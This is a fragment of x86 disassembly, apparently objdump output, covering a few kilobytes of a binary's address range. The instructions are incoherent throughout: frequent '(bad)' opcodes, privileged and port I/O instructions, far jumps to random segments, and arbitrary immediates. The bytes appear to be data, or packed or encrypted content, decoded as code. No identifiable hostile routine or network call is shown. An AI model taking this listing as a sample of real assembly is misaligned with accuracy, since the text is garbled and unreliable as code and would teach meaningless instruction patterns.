  413ba9:	daa    
  413baa:	and    DWORD PTR [ebx],ecx
  413bac:	mov    eax,ds:0xd2868a07
  413bb1:	outs   dx,DWORD PTR ds:[esi]
  413bb2:	es in  al,0xf4
  413bb5:	jle    0x413bfd
  413bb7:	(bad)  
  413bb8:	dec    ebx
  413bb9:	cmp    BYTE PTR [edi-0xb3f9b63],cl
  413bbf:	pop    edx
  413bc0:	mov    ebp,0x54cddb83
  413bc5:	jae    0x413b9f
  413bc7:	and    al,BYTE PTR [edx-0x6229f4ea]
  413bcd:	mov    bh,0xbf
  413bcf:	data16 sub al,BYTE PTR [eax+0x23250ef]
  413bd6:	cs push edx
  413bd8:	mov    WORD PTR [ebx],fs
  413bda:	aad    0x8f
  413bdc:	and    dl,dh
  413bde:	push   ebp
  413bdf:	jmp    0x84f15985
  413be4:	lds    esp,FWORD PTR [ebx+0x50]
  413be7:	das    
  413be8:	icebp  
  413be9:	add    ebx,DWORD PTR [edx-0xd]
  413bec:	jb     0x413b90
  413bee:	or     BYTE PTR ds:0xa4261d64,dh
  413bf4:	push   0x70
  413bf6:	js     0x413c2c
  413bf8:	ror    DWORD PTR [eax],0x26
  413bfb:	sub    eax,0xb1efb7f1
  413c00:	loop   0x413c74
  413c02:	or     DWORD PTR [edx+0x20074520],esp
  413c08:	or     DWORD PTR ds:0x26ffdce0,esi
  413c0e:	outs   dx,DWORD PTR ds:[esi]
  413c0f:	and    DWORD PTR [esi-0x67c12bc1],ecx
  413c15:	push   ebx
  413c16:	adc    ah,bl
  413c18:	mov    cl,0x12
  413c1a:	inc    edx
  413c1b:	push   ecx
  413c1c:	mov    eax,ds:0x92093104
  413c21:	aaa    
  413c22:	popa   
  413c23:	dec    ebp
  413c24:	sub    BYTE PTR [edx+0x3],dl
  413c27:	in     al,dx
  413c28:	push   ecx
  413c29:	adc    ebx,0xcb1bb0ce
  413c2f:	dec    ecx
  413c30:	push   0xffffffb2
  413c32:	idiv   BYTE PTR ds:0xb60147b0
  413c38:	into   
  413c39:	xchg   esi,eax
  413c3a:	inc    edi
  413c3b:	bound  eax,QWORD PTR [edx]
  413c3d:	call   0x7677:0x28526347
  413c44:	cmp    ch,BYTE PTR [edx]
  413c46:	add    esi,ecx
  413c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c49:	test   eax,0xa1994952
  413c4e:	xchg   ecx,eax
  413c4f:	sbb    dh,BYTE PTR [edx+edi*4-0x5e]
  413c53:	pop    esp
  413c54:	sbb    BYTE PTR [esi+0xe391cb6],bl
  413c5a:	xchg   ecx,eax
  413c5b:	icebp  
  413c5c:	xor    edi,DWORD PTR [esi-0x62]
  413c5f:	and    al,ah
  413c61:	ret    0x1f67
  413c64:	mov    ah,0x4a
  413c66:	jbe    0x413bf4
  413c68:	stc    
  413c69:	fisubr DWORD PTR [edx-0x2b]
  413c6c:	ins    DWORD PTR es:[edi],dx
  413c6d:	in     al,dx
  413c6e:	sbb    al,0xdf
  413c70:	dec    ebx
  413c71:	outs   dx,DWORD PTR ds:[esi]
  413c72:	fwait
  413c73:	in     al,0x83
  413c75:	mov    dh,0xe0
  413c77:	sahf   
  413c78:	mov    ecx,0x9fa59907
  413c7d:	jo     0x413cf7
  413c7f:	in     eax,0x53
  413c81:	test   al,0x51
  413c83:	loopne 0x413c27
  413c85:	jns    0x413c21
  413c87:	cs cmp al,0x82
  413c8a:	xchg   esp,eax
  413c8b:	aas    
  413c8c:	and    ebp,edi
  413c8e:	int    0xbf
  413c90:	or     DWORD PTR [edi+0x31],ebp
  413c93:	loopne 0x413c64
  413c95:	push   eax
  413c96:	jmp    0x413c80
  413c98:	outs   dx,BYTE PTR ds:[esi]
  413c99:	in     al,0x9f
  413c9b:	inc    esi
  413c9c:	sub    BYTE PTR [ebx],dh
  413c9e:	in     al,dx
  413c9f:	fmul   QWORD PTR fs:[ebx]
  413ca2:	xor    eax,DWORD PTR [ebx+0x19]
  413ca5:	push   eax
  413ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ca7:	ins    BYTE PTR es:[edi],dx
  413ca8:	retf   0xd5b4
  413cab:	pop    edi
  413cac:	pop    es
  413cad:	retfw  0x56f5
  413cb1:	jmp    0x7ca2:0x6429bcee
  413cb8:	scas   al,BYTE PTR es:[edi]
  413cb9:	adc    al,0xc2
  413cbb:	sub    ecx,edx
  413cbd:	call   0x4d33acfb
  413cc2:	std    
  413cc3:	mov    ah,0x57
  413cc5:	jo     0x413d39
  413cc7:	dec    esp
  413cc8:	test   BYTE PTR [esi+0x62d6588b],al
  413cce:	mov    bh,0x5e
  413cd0:	and    esp,esi
  413cd2:	jne    0x413cf7
  413cd4:	xchg   DWORD PTR [edi-0x42b93e22],edi
  413cda:	lock (bad) 
  413cdc:	ds (bad) 
  413cde:	retf   
  413cdf:	and    DWORD PTR [eax-0x25],ebp
  413ce2:	clc    
  413ce3:	fisub  DWORD PTR [ebx-0x55fc6cd6]
  413ce9:	data16 arpl WORD PTR [esi],sp
  413cec:	inc    esp
  413ced:	or     eax,0x682cd29f
  413cf2:	mul    BYTE PTR [esi]
  413cf4:	in     al,dx
  413cf5:	arpl   WORD PTR [esi],di
  413cf7:	pop    esi
  413cf8:	imul   edx,DWORD PTR [esi+0x66],0xb98bded
  413cff:	rol    BYTE PTR [edi],1
  413d01:	mov    ecx,0x252ff21c
  413d06:	rcl    DWORD PTR [esi+edi*1],cl
  413d09:	adc    BYTE PTR [ecx],bh
  413d0b:	das    
  413d0c:	fisubr WORD PTR [eax]
  413d0e:	jns    0x413d58
  413d10:	aas    
  413d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d12:	into   
  413d13:	xchg   ebp,eax
  413d14:	es das 
  413d16:	fisttp QWORD PTR [esi-0x7f]
  413d19:	repnz sbb BYTE PTR [edi+0x5aede867],cl
  413d20:	sub    eax,0x78543eda
  413d25:	lahf   
  413d26:	ret    
  413d27:	push   ecx
  413d28:	or     al,0x11
  413d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d2b:	adc    eax,0x5c8c8140
  413d30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d31:	call   0x31de:0xe1b6
  413d37:	shr    BYTE PTR [ebx+esi*8+0x3f],1
  413d3b:	lds    eax,FWORD PTR [ebx+edx*8+0x12daa9a9]
  413d42:	ds xor eax,0x72297bc8
  413d48:	cmp    BYTE PTR [esi-0x32],al
  413d4b:	icebp  
  413d4c:	clc    
  413d4d:	push   cs
  413d4e:	sar    BYTE PTR [edi+0x63],1
  413d51:	clc    
  413d52:	std    
  413d53:	sbb    esp,DWORD PTR [edx]
  413d55:	aam    0x51
  413d57:	mov    WORD PTR [ebx+0x31],gs
  413d5a:	call   DWORD PTR [eax]
  413d5c:	pop    esi
  413d5d:	xchg   edx,eax
  413d5e:	jae    0x413d38
  413d60:	mov    WORD PTR [ecx+0x27],?
  413d63:	enter  0x9f4a,0x47
  413d67:	rcr    DWORD PTR [eax],1
  413d69:	popf   
  413d6a:	(bad)  
  413d6b:	ret    0x88cf
  413d6e:	imul   esi,DWORD PTR [esi],0x13
  413d71:	ds stos DWORD PTR es:[edi],eax
  413d73:	jbe    0x413d2f
  413d75:	inc    edx
  413d76:	inc    esi
  413d77:	adc    ah,BYTE PTR [eax-0x1d243c32]
  413d7d:	jns    0x413d44
  413d7f:	popa   
  413d80:	cwde   
  413d81:	adc    eax,DWORD PTR [edi+0x549a2cca]
  413d87:	icebp  
  413d88:	pusha  
  413d89:	test   DWORD PTR [ebp-0x5f6a3add],0xa058fdc7
  413d93:	push   esi
  413d94:	jge    0x413d4f
  413d96:	test   al,0x4d
  413d98:	js     0x413dc5
  413d9a:	jne    0x413dec
  413d9c:	mov    eax,0xe0e74d6b
  413da1:	mov    edi,DWORD PTR [ebx+0x52795c55]
  413da7:	pop    ds
  413da8:	rcr    ebp,0xc4
  413dab:	jnp    0x413dcb
  413dad:	outs   dx,DWORD PTR ds:[esi]
  413dae:	es fwait
  413db0:	mov    bh,0x9b
  413db2:	mul    DWORD PTR [esi]
  413db4:	div    ecx
  413db6:	pop    ecx
  413db7:	xchg   ecx,eax
  413db8:	jp     0x413de9
  413dba:	test   al,0x9d
  413dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dbd:	cwde   
  413dbe:	(bad)  
  413dbf:	outs   dx,BYTE PTR ds:[esi]
  413dc0:	xor    dh,BYTE PTR [edi+0x4c1b8bce]
  413dc6:	xlat   BYTE PTR ds:[ebx]
  413dc7:	jbe    0x413d7b
  413dc9:	inc    esp
  413dca:	in     al,dx
  413dcb:	jl     0x413e44
  413dcd:	inc    edi
  413dce:	xchg   esi,eax
  413dcf:	cmp    DWORD PTR [edi+0x12],0x5bd1dd73
  413dd6:	push   ds
  413dd7:	add    ch,BYTE PTR [ebx+0x570555fd]
  413ddd:	push   esp
  413dde:	jl     0x413e25
  413de0:	imul   DWORD PTR [eax+ecx*1-0x79d7fbf9]
  413de7:	adc    ebx,0xffffffbd
  413dea:	mov    DWORD PTR [eax],esi
  413dec:	je     0x413dda
  413dee:	jmp    0x413e66
  413df0:	sbb    edi,0x97a6117c
  413df6:	scas   al,BYTE PTR es:[edi]
  413df7:	(bad)  
  413df8:	idiv   BYTE PTR [esi]
  413dfa:	push   edx
  413dfb:	jmp    0x6a36:0x4579d7da
  413e02:	nop
  413e03:	adc    al,0x97
  413e05:	call   0xa6fe7067
  413e0a:	(bad)  
  413e0b:	xor    al,0x56
  413e0d:	es inc ecx
  413e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e10:	cwde   
  413e11:	jnp    0x413dae
  413e13:	je     0x413e91
  413e15:	cmp    al,0xd2
  413e17:	add    ah,al
  413e19:	fimul  WORD PTR [ecx+0x41a7a6ee]
  413e1f:	retf   
  413e20:	sub    DWORD PTR [ebx],edi
  413e22:	addr16 out dx,al
  413e24:	cmp    edx,DWORD PTR [eax+0x44]
  413e27:	sbb    al,0x4
  413e29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e2b:	xor    edx,DWORD PTR ds:[esi-0x76]
  413e2f:	cli    
  413e30:	add    BYTE PTR [ecx],cl
  413e32:	sar    DWORD PTR [edx+edx*4],1
  413e35:	popf   
  413e36:	jo     0x413e8c
  413e38:	jbe    0x413e5c
  413e3a:	jo     0x413e7f
  413e3c:	dec    esp
  413e3d:	and    dh,bh
  413e3f:	mov    eax,cs:0x30b97102
  413e45:	(bad)  
  413e46:	scas   al,BYTE PTR es:[edi]
  413e47:	shl    BYTE PTR [edi+0x12],1
  413e4a:	(bad)
  413e4d:	mov    WORD PTR [edi+0x4400aba4],gs
  413e53:	aam    0xb8
  413e55:	dec    edx
  413e56:	sbb    DWORD PTR [edi],esp
  413e58:	mov    ebp,0x41962fe4
  413e5d:	mov    ebp,0xaf59399c
  413e62:	mov    al,0x48
  413e64:	push   ebx
  413e65:	and    bh,dl
  413e67:	std    
  413e68:	xor    BYTE PTR [ecx-0x2ec3a933],dh
  413e6e:	outs   dx,DWORD PTR ds:[esi]
  413e6f:	sbb    eax,0x3584a742
  413e74:	out    dx,eax
  413e75:	jns    0x413e99
  413e77:	pop    esi
  413e78:	xchg   esi,eax
  413e79:	sub    eax,0x7382d008
  413e7e:	fwait
  413e7f:	aam    0x22
  413e81:	push   ecx
  413e82:	(bad)  
  413e83:	mov    edi,0x1a734208
  413e88:	xchg   bl,bl
  413e8a:	add    ecx,ebp
  413e8c:	pop    ds
  413e8d:	mov    bh,bl
  413e8f:	sbb    DWORD PTR [ebx-0x34],esi
  413e92:	test   BYTE PTR [ebx+0x2d163a15],dl
  413e98:	push   eax
  413e99:	inc    ebx
  413e9a:	int3   
  413e9b:	dec    ebp
  413e9c:	fwait
  413e9d:	(bad)  
  413e9e:	hlt    
  413e9f:	sbb    DWORD PTR [ebp+ecx*4-0x62],0xf
  413ea4:	mov    bl,0x7a
  413ea6:	mov    ds,ebx
  413ea8:	arpl   dx,dx
  413eaa:	aad    0xa6
  413eac:	jge    0x413e47
  413eae:	and    al,0x5a
  413eb0:	pop    ebp
  413eb1:	xor    BYTE PTR [eax-0x4cbd1c3e],0x77
  413eb8:	jns    0x413f03
  413eba:	sub    esp,DWORD PTR [edx+ebx*4+0x59]
  413ebe:	test   BYTE PTR [ebx],ch
  413ec0:	imul   ebx,DWORD PTR [esi+esi*4+0x45],0xfffffff7
  413ec5:	and    ah,BYTE PTR [ebx+0x7903de25]
  413ecb:	sbb    eax,DWORD PTR [ebx-0x75]
  413ece:	inc    ebx
  413ecf:	jo     0x413eb1
  413ed1:	ds xchg ebp,eax
  413ed3:	sahf   
  413ed4:	mov    ah,0xa3
  413ed6:	pushf  
  413ed7:	outs   dx,DWORD PTR ds:[esi]
  413ed8:	mov    esp,0xb6170e94
  413edd:	aad    0x3e
  413edf:	enter  0xf67e,0x9f
  413ee3:	stos   DWORD PTR es:[edi],eax
  413ee4:	jne    0x413e8f
  413ee6:	mov    al,ds:0xeb6db577
  413eeb:	aaa    
  413eec:	jmp    0xbe88:0xc53d9d6
  413ef3:	(bad)  
  413ef4:	pop    esi
  413ef5:	popf   
  413ef6:	sub    al,0x30
  413ef8:	adc    ch,BYTE PTR [esi-0x41]
  413efb:	dec    ebx
  413efc:	mov    ebx,0xcd130384
  413f01:	stc    
  413f02:	fwait
  413f03:	mov    ecx,DWORD PTR [ebp+0x2077e6f7]
  413f09:	lds    esp,FWORD PTR [ebx]
  413f0b:	cld    
  413f0c:	sub    eax,0x7f998940
  413f11:	mov    edx,0x7aa45c3a
  413f16:	xchg   DWORD PTR ds:0xd0d105be,esp
  413f1c:	pop    di
  413f1e:	sub    esi,DWORD PTR [ebp-0x505df292]
  413f24:	jle    0x413f77
  413f26:	call   0x667e:0x21341038
  413f2d:	cmp    BYTE PTR [edi+0x6c515ae0],dh
  413f33:	lea    ebx,[eax+ebp*1-0x15208603]
  413f3a:	std    
  413f3b:	out    dx,al
  413f3c:	push   ecx
  413f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f3e:	cli    
  413f3f:	and    al,BYTE PTR ss:[ecx+0x6509f103]
  413f46:	mov    ch,0x45
  413f48:	(bad)  
  413f49:	js     0x413fc6
  413f4b:	les    eax,FWORD PTR [esi+0x67]
  413f4e:	push   esi
  413f4f:	dec    esi
  413f50:	mov    cl,0x12
  413f52:	dec    ebp
  413f53:	jge    0x413f7a
  413f55:	push   esi
  413f56:	mov    ecx,DWORD PTR ss:[ecx+0xea2d4c2]
  413f5d:	mov    esp,0x6a133679
  413f62:	add    DWORD PTR [esi-0x16ccf4a9],ebx
  413f68:	sub    ebx,eax
  413f6a:	sub    bl,BYTE PTR [esi+ebp*8-0x47]
  413f6e:	mov    dh,0x36
  413f70:	add    al,0x94
  413f72:	cmp    eax,0xcfb2e1ea
  413f77:	or     dl,BYTE PTR [ecx+0x50]
  413f7a:	int    0xc5
  413f7c:	les    esp,FWORD PTR [ebx]
  413f7e:	nop
  413f7f:	mov    ds:0x513da61,eax
  413f84:	mov    DWORD PTR [edx+0x62],esp
  413f87:	adc    esp,ecx
  413f89:	inc    ebp
  413f8a:	aaa    
  413f8b:	jbe    0x413ff3
  413f8d:	and    dl,BYTE PTR [ebp-0x7c011fae]
  413f93:	jb     0x413fdf
  413f95:	and    eax,DWORD PTR [ebp+0x15]
  413f98:	add    BYTE PTR [edx-0x37],0xed
  413f9c:	rcl    ch,1
  413f9e:	fwait
  413f9f:	mov    ecx,?
  413fa1:	pop    esp
  413fa2:	outs   dx,BYTE PTR ds:[si]
  413fa4:	(bad)  [edi]
  413fa6:	jge    0x413f8e
  413fa8:	(bad)
  413fab:	repz mov ah,0x67
  413fae:	stc    
  413faf:	dec    edi
  413fb0:	loop   0x413f84
  413fb2:	nop
  413fb3:	mov    bl,0xb9
  413fb5:	mov    DWORD PTR [edx-0x35],esp
  413fb8:	aas    
  413fb9:	dec    eax
  413fba:	mov    esi,esi
  413fbc:	imul   eax,DWORD PTR [ebx+0x7e],0xf
  413fc0:	test   eax,0xa9b0f303
  413fc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fc6:	leave  
  413fc7:	ins    DWORD PTR es:[edi],dx
  413fc8:	push   ebx
  413fc9:	nop
  413fca:	add    esi,eax
  413fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fcd:	xor    BYTE PTR [ebp-0x72],0x68
  413fd1:	push   eax
  413fd2:	mov    bl,0x16
  413fd4:	sub    esp,DWORD PTR es:[ecx+edi*8-0x21408eb4]
  413fdc:	sbb    BYTE PTR [ecx-0x75bcb4d9],ch
  413fe2:	dec    eax
  413fe3:	iret   
  413fe4:	leave  
  413fe5:	adc    DWORD PTR [edi],esp
  413fe7:	and    eax,0xfa0ee670
  413fec:	cdq    
  413fed:	(bad)  
  413fee:	and    DWORD PTR [ebx+0x48],edx
  413ff1:	(bad)  
  413ff2:	jp     0x41405f
  413ff4:	cmp    ebp,DWORD PTR [esi+ecx*2-0xfb5523d]
  413ffb:	sbb    ebx,DWORD PTR [esi-0x30c30f76]
  414001:	sbb    al,0x7a
  414003:	cwde   
  414004:	push   0xcc41fcdb
  414009:	add    al,cl
  41400b:	and    al,0xf8
  41400d:	push   0xc5ee169c
  414012:	fcomi  st,st(6)
  414014:	pop    esp
  414015:	mov    cl,bh
  414017:	sbb    bl,dl
  414019:	shr    DWORD PTR [esi-0x408e333e],0xb6
  414020:	inc    ebx
  414021:	xchg   DWORD PTR [edx+0x6f32183],ecx
  414027:	push   0xb
  414029:	xor    al,0xa
  41402b:	mov    eax,ds:0x2aa9fda
  414030:	and    BYTE PTR [ecx+esi*4],cl
  414033:	lds    edi,FWORD PTR [ecx+0x43]
  414036:	xchg   ebx,eax
  414037:	dec    edi
  414038:	addr16 mov esi,0x55d93ee1
  41403e:	idiv   BYTE PTR [edx+eax*1+0x17]
  414042:	push   ds
  414043:	jp     0x4140c2
  414045:	mov    ebp,0xd39f7fab
  41404a:	lods   eax,DWORD PTR ds:[esi]
  41404b:	add    eax,edi
  41404d:	js     0x414059
  41404f:	jne    0x413ff8
  414051:	mov    dl,0xd1
  414053:	mov    WORD PTR ds:0xa6ed7936,?
  414059:	mov    BYTE PTR [esi+0x74],0xa1
  41405d:	jecxz  0x4140c7
  41405f:	mov    ah,0x3b
  414061:	aaa    
  414062:	fcomp  QWORD PTR [edx]
  414064:	mov    cl,0x60
  414066:	xlat   BYTE PTR ds:[ebx]
  414067:	mov    al,dh
  414069:	inc    ebp
  41406a:	jmp    0x7acb787d
  41406f:	in     eax,dx
  414070:	push   edx
  414071:	shl    DWORD PTR [ecx-0x6a76960a],1
  414077:	mov    dh,0xb0
  414079:	rcr    DWORD PTR [ebx],1
  41407b:	(bad)  
  41407c:	pop    ebx
  41407d:	mov    bh,0x18
  41407f:	mov    al,0x7d
  414081:	repz cld 
  414083:	mov    ecx,0x4c0f8435
  414088:	(bad)  
  414089:	outs   dx,BYTE PTR ds:[esi]
  41408a:	lea    esi,[edx+0xaf0a564]
  414090:	sahf   
  414091:	mov    ds:0xcad39f4,al
  414096:	mov    ah,0x92
  414098:	arpl   WORD PTR [ebx+0x5f1ea457],si
  41409e:	clc    
  41409f:	test   DWORD PTR [esi+esi*1],esi
  4140a2:	cdq    
  4140a3:	out    0x6e,eax
  4140a5:	retf   
  4140a6:	test   eax,0x398e7dd6
  4140ab:	mov    ds:0xffef0b65,al
  4140b0:	or     BYTE PTR [eax+0x68],0x65
  4140b4:	xor    al,0xc5
  4140b6:	pop    ecx
  4140b7:	int    0x31
  4140b9:	mov    ?,WORD PTR [ecx]
  4140bb:	das    
  4140bc:	push   0x6a
  4140be:	dec    ebx
  4140bf:	pop    esp
  4140c0:	in     al,dx
  4140c1:	mov    al,0xaa
  4140c3:	mov    ebx,0xb05be35d
  4140c8:	scas   eax,DWORD PTR es:[edi]
  4140c9:	leave  
  4140ca:	pop    ebx
  4140cb:	add    eax,0x2f288749
  4140d0:	es inc edi
  4140d2:	xchg   edi,eax
  4140d3:	scas   eax,DWORD PTR es:[edi]
  4140d4:	bswap  ebp
  4140d6:	adc    bl,BYTE PTR [ebx+esi*8]
  4140d9:	(bad)  
  4140da:	jns    0x414062
  4140dc:	cmp    ecx,edx
  4140de:	xchg   esp,eax
  4140df:	mov    edi,0xa5077cdc
  4140e4:	sbb    BYTE PTR [ebx+0x35b12a13],bh
  4140ea:	sti    
  4140eb:	push   ds
  4140ec:	pusha  
  4140ed:	mov    ?,WORD PTR [ebx-0x1b]
  4140f0:	dec    esp
  4140f1:	sbb    edx,ecx
  4140f3:	cmp    BYTE PTR [esi+0x3e],bl
  4140f6:	je     0x4140f0
  4140f8:	addr16 in al,dx
  4140fa:	imul   edx,DWORD PTR [edi],0x74eb0c59
  414100:	jl     0x4140ca
  414102:	rcr    BYTE PTR [ecx],0xb8
  414105:	mov    eax,DWORD PTR [ebx-0x13bd05d5]
  41410b:	std    
  41410c:	(bad)  
  41410d:	retf   
  41410e:	xlat   BYTE PTR ds:[ebx]
  41410f:	ret    0x6a73
  414112:	(bad)  
  414113:	mov    esp,0x554edec8
  414118:	jno    0x4140ed
  41411a:	mov    ah,0x54
  41411d:	adc    bl,BYTE PTR [edi]
  41411f:	ins    BYTE PTR es:[edi],dx
  414120:	pop    ds
  414121:	shr    DWORD PTR [eax-0x1d],cl
  414124:	xor    bh,BYTE PTR [esi]
  414126:	push   es
  414127:	or     BYTE PTR [ebp+0x33],dh
  41412a:	adc    eax,0xb02fa6cd
  41412f:	ja     0x414147
  414131:	push   ebp
  414132:	cs jmp 0xe681:0xe444656
  41413a:	rol    ch,1
  41413c:	jge    0x41419c
  41413e:	js     0x41415f
  414140:	sbb    eax,0x6fb90bcc
  414145:	add    edi,DWORD PTR [edx+0x2b]
  414148:	xor    edx,DWORD PTR [edx]
  41414a:	jmp    0xa2b39c8c
  41414f:	jecxz  0x41417d
  414151:	lds    ebx,FWORD PTR [edx]
  414153:	cmp    edx,ecx
  414155:	popf   
  414156:	jae    0x41417f
  414158:	add    dl,BYTE PTR [edi-0x323fecd7]
  41415e:	sub    edi,DWORD PTR [edi]
  414160:	push   esi
  414161:	sub    ch,cl
  414163:	call   0x43d1:0xe8c7d14f
  41416a:	sbb    eax,0xb2abcc81
  41416f:	add    BYTE PTR [ecx],cl
  414171:	mov    bh,0x69
  414173:	jno    0x4141e9
  414175:	shr    dl,cl
  414177:	shl    BYTE PTR [ebp+0xd],cl
  41417a:	adc    bh,BYTE PTR [ebx-0x13]
  41417d:	int    0xa3
  41417f:	cmp    DWORD PTR [ebx-0x3e],eax
  414182:	xlat   BYTE PTR ds:[ebx]
  414183:	in     eax,0x92
  414185:	in     al,0x93
  414187:	fstp   DWORD PTR [ebp-0x6f5dda38]
  41418d:	adc    eax,0xdad60047
  414192:	push   ebp
  414193:	adc    al,0xe4
  414195:	xlat   BYTE PTR ds:[ebx]
  414196:	lahf   
  414197:	add    al,0x5c
  414199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41419a:	dec    ecx
  41419b:	or     eax,0xf2d19d26
  4141a0:	jl     0x4141e7
  4141a2:	xor    eax,0xff73aca9
  4141a7:	adc    eax,0x52538573
  4141ac:	test   eax,0x5dbe6a5d
  4141b1:	outs   dx,BYTE PTR ds:[esi]
  4141b2:	pop    ss
  4141b3:	jge    0x41415a
  4141b5:	pusha  
  4141b6:	out    dx,al
  4141b7:	jmp    0xf276:0xe13a0fc8
  4141be:	ins    BYTE PTR es:[edi],dx
  4141bf:	xchg   BYTE PTR [esp+ebp*4-0x39],ah
  4141c3:	add    ebp,DWORD PTR [esi-0x34e8fa30]
  4141c9:	cmp    esi,ebx
  4141cb:	mov    es,WORD PTR [ebx-0x3e0f3b9d]
  4141d1:	or     esp,DWORD PTR [esi+0x2df401c3]
  4141d7:	(bad)  
  4141d8:	aad    0xbe
  4141da:	std    
  4141db:	cld    
  4141dc:	jno    0x4141b4
  4141de:	inc    ecx
  4141df:	stos   DWORD PTR es:[edi],eax
  4141e0:	xchg   ecx,eax
  4141e1:	fs push ebx
  4141e3:	(bad)  
  4141e4:	sbb    edi,DWORD PTR [ecx]
  4141e6:	adc    BYTE PTR [ebx+0x51101930],cl
  4141ec:	int3   
  4141ed:	dec    esp
  4141ee:	arpl   WORD PTR [ecx],sp
  4141f0:	jecxz  0x41421d
  4141f2:	jle    0x4141c6
  4141f4:	int3   
  4141f5:	ds pop ss
  4141f7:	popf   
  4141f8:	sub    eax,0xd576fbaf
  4141fd:	dec    bx
  4141ff:	xchg   esi,eax
  414200:	imul   edx,DWORD PTR cs:[edi],0xffffffc7
  414204:	in     al,0x3a
  414206:	push   esp
  414207:	sbb    BYTE PTR [edx],bh
  414209:	ja     0x414243
  41420b:	sbb    al,0x42
  41420d:	gs xor al,0xbf
  414210:	dec    ebp
  414211:	sahf   
  414212:	imul   ebx,DWORD PTR [ebx-0x4e852ace],0xaaf7ac9a
  41421c:	in     al,dx
  41421d:	hlt    
  41421e:	mov    ds:0x2acafc7c,eax
  414223:	or     BYTE PTR [ebx-0x52],ch
  414226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414227:	popf   
  414228:	xchg   cl,dh
  41422a:	adc    eax,0xd122240e
  41422f:	loop   0x414295
  414231:	and    ecx,eax
  414233:	hlt    
  414234:	mov    esp,0x98329224
  414239:	jge    0x414241
  41423b:	fimul  DWORD PTR [edx]
  41423d:	daa    
  41423e:	popf   
  41423f:	test   DWORD PTR [eax],0xe5d18685
  414245:	jl     0x4142ad
  414247:	in     al,0xf5
  414249:	pusha  
  41424a:	mov    dh,0xc5
  41424c:	mov    BYTE PTR [edi-0x136b84b1],al
  414252:	aas    
  414253:	mov    ds:0x3c18663d,eax
  414258:	adc    eax,0x9cec0d0a
  41425d:	rcr    BYTE PTR [ebx+0x4279b7b0],0x57
  414264:	lock xchg DWORD PTR [eax+0x468c48b4],ebp
  41426b:	add    ebx,ecx
  41426d:	xlat   BYTE PTR ds:[ebx]
  41426e:	jg     0x414208
  414270:	or     esp,DWORD PTR [esi-0x29e990bd]
  414276:	mov    ch,0x48
  414278:	mov    eax,0xd6ce5f95
  41427d:	aaa    
  41427e:	test   al,0x64
  414280:	mov    bh,0xfc
  414282:	call   0xb635c1e
  414287:	pop    esp
  414288:	xor    esp,ebx
  41428a:	add    cl,ch
  41428c:	dec    ebp
  41428d:	pop    eax
  41428e:	aas    
  41428f:	adc    DWORD PTR [ebp+ecx*2-0x54a99bdc],0x69
  414297:	imul   esi,edi,0xffffff8d
  41429a:	pop    ebx
  41429b:	xchg   BYTE PTR [ecx-0x62],dh
  41429e:	arpl   WORD PTR [edx-0x3a8921cb],cx
  4142a4:	cwde   
  4142a5:	cld    
  4142a6:	adc    ebx,DWORD PTR [edx-0x598eaf2c]
  4142ac:	lods   al,BYTE PTR ds:[esi]
  4142ad:	int    0x53
  4142af:	pop    ss
  4142b0:	mov    ebx,0xfab11b5c
  4142b5:	in     eax,0xf6
  4142b7:	jo     0x414260
  4142b9:	aaa    
  4142ba:	js     0x414305
  4142bc:	sbb    al,0xd
  4142be:	rol    ecx,0x60
  4142c1:	sub    dh,BYTE PTR [esi]
  4142c3:	push   0xab8183c6
  4142c8:	inc    esi
  4142c9:	arpl   WORD PTR [esi+ecx*8],sp
  4142cc:	push   ds
  4142cd:	jno    0x4142a9
  4142cf:	cs mov ebp,0xec612675
  4142d5:	add    eax,0x516e53f2
  4142da:	mov    bh,0x5c
  4142dc:	push   edx
  4142dd:	dec    ebp
  4142de:	dec    edi
  4142df:	cwde   
  4142e0:	in     al,dx
  4142e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142e2:	xchg   edx,eax
  4142e3:	sti    
  4142e4:	xchg   edx,eax
  4142e5:	out    dx,eax
  4142e6:	mov    eax,0x850a0ab3
  4142eb:	jo     0x4142b7
  4142ed:	inc    eax
  4142ee:	aaa    
  4142ef:	or     BYTE PTR [esi-0x22816ac0],0xd9
  4142f6:	sub    bl,cl
  4142f8:	jno    0x4142ee
  4142fa:	sbb    eax,eax
  4142fc:	or     eax,0xc54dd35
  414301:	aas    
  414302:	test   eax,0xc9b182a0
  414308:	dec    edx
  414309:	inc    edx
  41430a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41430b:	jb     0x4142f6
  41430d:	pop    esi
  41430e:	pop    esi
  41430f:	call   DWORD PTR [edi+0x3a]
  414312:	call   DWORD PTR [edi+edx*8]
  414315:	daa    
  414316:	mov    cs,WORD PTR [ecx]
  414318:	daa    
  414319:	adc    bh,bl
  41431b:	shl    BYTE PTR [ebx+0x63],cl
  41431e:	and    ch,BYTE PTR [edi]
  414320:	jmp    0x36825aa3
  414325:	mov    ebx,0x4ae1e950
  41432a:	in     al,0x53
  41432c:	mov    bl,0x3e
  41432e:	cmp    ecx,eax
  414330:	xchg   ecx,eax
  414331:	nop
  414332:	or     DWORD PTR [ebx+0x68],esi
  414335:	aad    0x5
  414337:	mov    dh,dh
  414339:	jp     0x4142d2
  41433b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41433c:	adc    eax,DWORD PTR [edx]
  41433e:	inc    esp
  41433f:	push   ebx
  414340:	mov    DWORD PTR [ebx+0x73],ebx
  414343:	imul   esp,DWORD PTR [esi+0x49fc0fa0],0xfffffff1
  41434a:	mov    al,ds:0xe2ad873e
  41434f:	push   0x24
  414351:	scas   al,BYTE PTR es:[edi]
  414352:	sbb    ah,ah
  414354:	test   BYTE PTR [ecx],cl
